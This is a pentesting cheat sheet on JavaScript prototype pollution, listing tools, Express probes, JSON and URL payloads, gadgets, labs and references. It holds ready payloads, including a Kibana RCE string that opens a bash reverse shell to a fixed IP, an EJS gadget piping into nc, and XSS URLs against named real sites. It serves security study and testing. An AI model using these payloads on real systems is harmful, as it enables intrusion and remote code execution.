# prototype pollution

> prototype pollution is a type of vulnerability that occurs in javascript when properties of object.prototype are modified. this is particularly risky because javascript objects are dynamic and we can add properties to them at any time. also, almost all objects in javascript inherit from object.prototype, making it a potential attack vector.


## summary

* [tools](#tools)
* [methodology](#methodology)
    * [examples](#examples)
    * [manual testing](#manual-testing)
    * [prototype pollution via json input](#prototype-pollution-via-json-input)
    * [prototype pollution in url](#prototype-pollution-in-url)
    * [prototype pollution payloads](#prototype-pollution-payloads)
    * [prototype pollution gadgets](#prototype-pollution-gadgets)
* [labs](#labs)
* [references](#references)


## tools

* [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder) - help you find gadget for prototype pollution exploitation
* [yuske/silent-spring](https://github.com/yuske/silent-spring) - prototype pollution leads to remote code execution in node.js
* [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) - server-side prototype pollution gadgets in node.js core code and 3rd party npm packages
* [blackfan/client-side-prototype-pollution](https://github.com/blackfan/client-side-prototype-pollution) - prototype pollution and useful script gadgets
* [portswigger/server-side-prototype-pollution](https://github.com/portswigger/server-side-prototype-pollution) - burp suite extension detectiong prototype pollution vulnerabilities
* [msrkp/ppscan](https://github.com/msrkp/ppscan) - client side prototype pollution scanner 


## methodology

in javascript, prototypes are what allow objects to inherit features from other objects. if an attacker is able to add or modify properties of `object.prototype`, they can essentially affect all objects that inherit from that prototype, potentially leading to various kinds of security risks.

```js
var mydog = new dog();
```

```js
// points to the function "dog"
mydog.constructor;
```

```js
// points to the class definition of "dog"
mydog.constructor.prototype;
mydog.__proto__;
mydog["__proto__"];
```


### examples

* imagine that an application uses an object to maintain configuration settings, like this:
    ```js
    let config = {
        isadmin: false
    };
    ```
* an attacker might be able to add an `isadmin` property to `object.prototype`, like this:
    ```js
    object.prototype.isadmin = true;
    ```


### manual testing

* expressjs: `{ "__proto__":{"parameterlimit":1}}` + 2 parameters in get request, at least 1 must be reflected in the response.
* expressjs: `{ "__proto__":{"ignorequeryprefix":true}}` + `??foo=bar`
* expressjs: `{ "__proto__":{"allowdots":true}}` + `?foo.bar=baz`
* change the padding of a json response: `{ "__proto__":{"json spaces":" "}}` + `{"foo":"bar"}`, the server should return `{"foo": "bar"}`
* modify cors header responses: `{ "__proto__":{"exposedheaders":["foo"]}}`, the server should return the header `access-control-expose-headers`.
* change the status code: `{ "__proto__":{"status":510}}`


### prototype pollution via json input

you can access the prototype of any object via the magic property `__proto__`. 
the `json.parse()` function in javascript is used to parse a json string and convert it into a javascript object. typically it is a sink function where prototype pollution can happen.


```js
{
    "__proto__": {
        "evilproperty": "evilpayload"
    }
}
```

asynchronous payload for nodejs.

```js
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "node_options":"--inspect=payload\"\".oastify\"\".com"
  }
}
```

polluting the prototype via the `constructor` property instead.

```js
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```


### prototype pollution in url

example of prototype pollution payloads found in the wild.

```ps1
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventdefault.__proto__.handleobj.__proto__.delegatetarget=%3cimg/src/onerror=alert(1)%3e
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```


### prototype pollution exploitation

depending if the prototype pollution is executed client (cspp) or server side (sspp), the impact will vary.

* remote command execution: [rce in kibana (cve-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
    ```js
    .es(*).props(label.__proto__.env.aaaa='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
    .props(label.__proto__.env.node_options='--require /proc/self/environ')
    ```
* remote command execution: [rce using ejs gadgets](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)
    ```js
    {
        "__proto__": {
            "client": 1,
            "escapefunction": "json.stringify; process.mainmodule.require('child_process').exec('id | nc localhost 4444')"
        }
    }
    ```
* reflected xss: [reflected xss on www.hackerone.com via wistia embed code - #986386](https://hackerone.com/reports/986386)
* client-side bypass: [prototype pollution – and bypassing client-side html sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
* denial of service


### prototype pollution payloads

```js
object.__proto__["evilproperty"]="evilpayload"
object.__proto__.evilproperty="evilpayload"
object.constructor.prototype.evilproperty="evilpayload"
object.constructor["prototype"]["evilproperty"]="evilpayload"
{"__proto__": {"evilproperty": "evilpayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test
```


### prototype pollution gadgets

a "gadget" in the context of vulnerabilities typically refers to a piece of code or functionality that can be exploited or leveraged during an attack. when we talk about a "prototype pollution gadget," we're referring to a specific code path, function, or feature of an application that is susceptible to or can be exploited through a prototype pollution attack.

either create your own gadget using part of the source with [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder), or try to use already discovered gadgets [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) / [blackfan/client-side-prototype-pollution](https://github.com/blackfan/client-side-prototype-pollution).


## labs

* [yeswehack dojo - prototype pollution](https://dojo-yeswehack.com/xss/training/prototype-pollution)
* [portswigger - prototype pollution](https://portswigger.net/web-security/all-labs#prototype-pollution)


## references

- [a pentester's guide to prototype pollution attacks - harsh bothra - january 2, 2023](https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks)
- [a tale of making internet pollution free - exploiting client-side prototype pollution in the wild - s1r1us - september 28, 2021](https://blog.s1r1us.ninja/research/pp)
- [detecting server-side prototype pollution - daniel thatcher - february 15, 2023](https://www.intruder.io/research/server-side-prototype-pollution)
- [exploiting prototype pollution – rce in kibana (cve-2019-7609) - michał bentkowski - october 30, 2019](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
- [keynote | server side prototype pollution: blackbox detection without the dos - gareth heyes - march 27, 2023](https://youtu.be/ld-kcukm_0m)
- [nodejs - \_\_proto\_\_ & prototype pollution - hacktricks - july 19, 2024](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
- [prototype pollution - portswigger - november 10, 2022](https://portswigger.net/web-security/prototype-pollution)
- [prototype pollution - snyk - august 19, 2023](https://learn.snyk.io/lessons/prototype-pollution/javascript/)
- [prototype pollution and bypassing client-side html sanitizers - michał bentkowski - august 18, 2020](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
- [prototype pollution and where to find them - bitk & sakiir - august 14, 2023](https://youtu.be/mwph9df_rda)
- [prototype pollution attacks in nodejs - olivier arteau - may 16, 2018](https://github.com/holyvier/prototype-pollution-nsec18/blob/master/paper/javascript_prototype_pollution_attack_in_nodejs.pdf)
- [prototype pollution attacks in nodejs applications - olivier arteau - october 3, 2018](https://youtu.be/lusifv3dsk8)
- [prototype pollution leads to rce: gadgets everywhere - mikhail shcherbakov - september 29, 2023](https://youtu.be/v5dq80s1wf4)
- [server side prototype pollution, how to detect and exploit - bitk - february 18, 2023](http://web.archive.org/web/20230218081534/https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/)
- [server-side prototype pollution: black-box detection without the dos - gareth heyes - february 15, 2023](https://portswigger.net/research/server-side-prototype-pollution)